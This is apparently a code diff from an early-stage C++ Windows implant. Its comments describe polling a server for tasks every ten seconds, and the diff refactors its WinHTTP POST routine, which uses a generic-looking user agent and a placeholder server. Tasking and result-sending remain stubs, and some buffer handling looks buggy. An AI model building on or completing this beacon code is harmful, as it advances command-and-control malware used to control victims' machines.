@@ -10,16 +10,11 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #define SERVERNAME "placeholder"
 #define SLEEP 10
 
-
-LPCSTR needthis="winhttp.h";
-HMODULE winhttp=LoadLibraryA(needthis);
-
 size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
 {
     data->append((char *)ptr, size * nmemb);
     return size * nmemb;
 }
-
 
 void tasks()
 {
@@ -29,22 +24,17 @@ void tasks()
     }
 }
 
-int get_id()
-{
-    LPCWSTR postdata = L"mac address, some unique id";
-    DWORD datalen = wcslen(postdata);
-    LPCWSTR uniquedata = L"x";
-    HINTERNET asyncsesh = WinHttpOpen(
+int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata){
+    DWORD datalen=strlen(postdata);
+    HINTERNET httpsession = WinHttpOpen(
         L"GenericAPICaller",
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
-        WINHTTP_FLAG_ASYNC);
-    LPCWSTR servername = L"google.com";
-    if (asyncsesh != NULL)
-    {
+        0);
+    if(httpsession!=NULL){
         HINTERNET connectsesh = WinHttpConnect(
-            asyncsesh,
+            httpsession,
             servername,
             INTERNET_DEFAULT_HTTPS_PORT,
             0);
@@ -53,7 +43,7 @@ int get_id()
             HINTERNET request = WinHttpOpenRequest(
                 connectsesh,
                 L"POST",
-                L"get_id",
+                subdirectory,
                 NULL,
                 WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
@@ -66,35 +56,46 @@ int get_id()
                     0,
                     (LPVOID)postdata,
                     datalen,
-                    0,
+                    datalen,
                     0);
                 if (idrequest == TRUE)
                 {
                     BOOL response = WinHttpReceiveResponse(
                         request,
                         NULL);
+                    if(response==true)
+                    {
+                        DWORD bytesneeded;
+                        BOOL query= WinHttpQueryDataAvailable(
+                        request,
+                        &bytesneeded);
+                        LPSTR returnbuffer=new char[bytesneeded+1];
+                        if(query==TRUE){
+                            if(returnbuffer){
+                                ZeroMemory(returnbuffer, bytesneeded+1);
+                                BOOL dataread=WinHttpReadData(
+                                request,
+                                returnbuffer,
+                                bytesneeded+1,
+                                NULL);
+                                if(dataread==TRUE){
+                                    return 0;
+                                }
+                            }
+                        }
+                    }
                 }
-                LPDWORD bytesneeded;
-                WinHttpQueryDataAvailable(
-                    request,
-                    bytesneeded);
-                char *returnbuffer = (char *)malloc((size_t)bytesneeded);
-                WinHttpReadData(
-                    request,
-                    returnbuffer,
-                    *bytesneeded,
-                    NULL);
-                std::cout << returnbuffer;
-                return 0;
             }
         }
     }
-    return 0;
+return -1;
 }
+
 
 int sendresults()
 {
-    while (1){
+    while (1)
+    {
         Sleep(SLEEP);
         // Send results, check response
         // If good response break
@@ -128,14 +129,5 @@ char *make_base_payload(char *implant_id)
 
 int main(int argc, char *argv[])
 {
-
-    // char blah[33];
-    // strcpy(blah, random_id());
-    // printf("%s\n", blah);
-
-    // register_();
-
-    get_id();
-
-    return 0;
+return 0;
 }
